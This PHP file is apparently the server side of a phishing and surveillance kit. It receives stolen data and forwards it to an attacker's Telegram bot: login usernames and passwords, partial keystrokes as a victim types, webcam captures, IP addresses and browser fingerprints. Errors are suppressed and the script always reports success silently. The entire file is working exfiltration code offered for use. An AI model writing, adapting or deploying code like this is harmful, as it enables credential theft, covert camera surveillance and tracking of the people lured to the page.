<?php
// ============================================
// POST.PHP - Send Everything to Telegram
// No local files saved - all to Telegram
// ============================================

// Suppress all errors
error_reporting(0);
ini_set('display_errors', 0);

// Load Telegram config
$config_file = 'telegram_config.json';
if (!file_exists($config_file)) {
    die('{"status":"error","message":"Config missing"}');
}

$config = json_decode(file_get_contents($config_file), true);
if (empty($config['bot_token']) || empty($config['chat_id'])) {
    die('{"status":"error","message":"Invalid config"}');
}

$botToken = $config['bot_token'];
$chatId = $config['chat_id'];

// ============================================
// GET DATA
// ============================================
$type = $_POST['tg_type'] ?? '';
$ip = $_POST['tg_ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ua = $_POST['tg_ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = $_POST['tg_time'] ?? date('Y-m-d H:i:s');

// ============================================
// TELEGRAM SEND FUNCTION
// ============================================
function sendTelegramMessage($message, $photoPath = null) {
    global $botToken, $chatId;
    
    if ($photoPath && file_exists($photoPath)) {
        // Send photo
        $url = "https://api.telegram.org/bot$botToken/sendPhoto";
        $cfile = curl_file_create($photoPath, 'image/png', 'capture.png');
        $data = [
            'chat_id' => $chatId,
            'photo' => $cfile,
            'caption' => $message,
            'parse_mode' => 'HTML'
        ];
    } else {
        // Send text
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode == 200;
}

// ============================================
// HANDLE DIFFERENT DATA TYPES
// ============================================
$response = ['status' => 'ok'];

switch ($type) {
    // ==========================================
    // IP ADDRESS
    // ==========================================
    case 'IP':
        $message = "🌐 <b>IP ADDRESS DETECTED</b>\n";
        $message .= "IP: <code>" . htmlspecialchars($_POST['tg_data'] ?? $ip) . "</code>\n";
        $message .= "UA: " . htmlspecialchars($ua) . "\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // CAMERA IMAGE
    // ==========================================
    case 'image':
        $imageData = $_POST['tg_image'] ?? '';
        if (!empty($imageData) && strpos($imageData, 'data:image') !== false) {
            // Save temp image
            $filteredData = substr($imageData, strpos($imageData, ",") + 1);
            $unencodedData = base64_decode($filteredData);
            $tempFile = tempnam(sys_get_temp_dir(), 'img') . '.png';
            file_put_contents($tempFile, $unencodedData);
            
            // Send to Telegram
            $caption = "📸 <b>CAMERA CAPTURE</b>\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time\n";
            $caption .= "UA: " . htmlspecialchars($ua);
            
            sendTelegramMessage($caption, $tempFile);
            
            // Clean up
            unlink($tempFile);
        }
        break;
    
    // ==========================================
    // LOGIN CREDENTIALS
    // ==========================================
    case 'login':
        $username = $_POST['tg_username'] ?? 'N/A';
        $password = $_POST['tg_password'] ?? 'N/A';
        
        $message = "🔐 <b>LOGIN CREDENTIALS CAPTURED</b>\n\n";
        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "🖥️ <b>UA:</b> " . htmlspecialchars($ua) . "\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // CREDENTIALS (JSON format)
    // ==========================================
    case 'credentials':
        $data = json_decode($_POST['tg_data'] ?? '{}', true);
        $username = $data['username'] ?? 'N/A';
        $password = $data['password'] ?? 'N/A';
        
        $message = "🔐 <b>CREDENTIALS (JSON)</b>\n\n";
        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // PARTIAL USERNAME TYPING
    // ==========================================
    case 'typing':
        $partial = $_POST['tg_data'] ?? 'N/A';
        $message = "⌨️ <b>USERNAME TYPING DETECTED</b>\n\n";
        $message .= "📝 <b>Typed:</b> <code>" . htmlspecialchars($partial) . "</code>\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // BROWSER INFO
    // ==========================================
    case 'browser_info':
        $info = json_decode($_POST['tg_data'] ?? '{}', true);
        $message = "💻 <b>BROWSER INFO</b>\n\n";
        $message .= "📱 <b>UA:</b> " . htmlspecialchars($ua) . "\n";
        $message .= "🖥️ <b>Platform:</b> " . ($info['platform'] ?? 'N/A') . "\n";
        $message .= "🌍 <b>Language:</b> " . ($info['language'] ?? 'N/A') . "\n";
        $message .= "📐 <b>Screen:</b> " . ($info['screen'] ?? 'N/A') . "\n";
        $message .= "🕐 <b>Timezone:</b> " . ($info['timezone'] ?? 'N/A') . "\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // PAGE VIEW
    // ==========================================
    case 'page_view':
        $message = "👁️ <b>PAGE VIEW</b>\n\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "🖥️ <b>UA:</b> " . htmlspecialchars($ua) . "\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // DEFAULT - Log everything else
    // ==========================================
    default:
        if (!empty($_POST)) {
            $message = "📦 <b>DATA RECEIVED</b>\n\n";
            $message .= "📝 <b>Type:</b> " . htmlspecialchars($type) . "\n";
            $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
            $message .= "⏰ <b>Time:</b> $time\n\n";
            $message .= "<b>Raw Data:</b>\n<pre>" . htmlspecialchars(print_r($_POST, true)) . "</pre>";
            
            sendTelegramMessage($message);
        }
        break;
}

// ============================================
// RESPONSE - Always return success silently
// ============================================
header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
?>
